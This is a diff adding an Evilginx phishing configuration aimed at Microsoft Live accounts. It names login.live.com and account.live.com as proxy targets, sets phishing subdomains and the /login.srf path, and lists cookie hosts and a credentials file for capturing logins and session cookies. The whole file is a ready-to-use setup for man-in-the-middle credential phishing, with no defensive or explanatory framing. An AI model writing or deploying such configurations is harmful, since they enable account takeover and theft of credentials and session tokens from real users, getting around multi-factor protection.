@@ -1,0 +1,12 @@
+[site]
+name=live
+site_conf=["login.live.com.conf","account.live.com.conf"]
+creds_conf=live.creds
+phish_subdomains=["login"]
+phish_paths=["/login.srf"]
+target_hosts=["login.live.com","account.live.com"]
+cookie_hosts=["live.com"]
+redir_arg=rc
+success_arg=rd
+log_name=evilginx-live.log
+cert_subdomains=["login","account"]
